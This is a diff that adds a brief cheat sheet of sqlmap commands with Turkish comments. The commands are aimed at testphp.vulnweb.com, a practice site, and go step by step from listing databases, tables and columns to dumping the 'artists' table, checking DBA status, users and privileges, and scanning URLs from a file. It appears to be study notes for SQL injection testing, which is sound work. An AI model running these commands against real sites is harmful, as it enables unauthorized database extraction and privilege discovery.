@@ -1,0 +1,12 @@
+database i verir
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
+tabloyu verir
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
+tablonun içindeki kolonu verir
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists --columns
+onun içindeki adresleri gösterir
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists -C adesc,artists --dump
+yetki kontrolü
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --risk=3 --level=3 --dbms=mysql --is-dba --users --privileges --roles
+birden fazla adresi tarama
+sqlmap -m "C:\Users\[USER]\Desktop\linkler.txt"
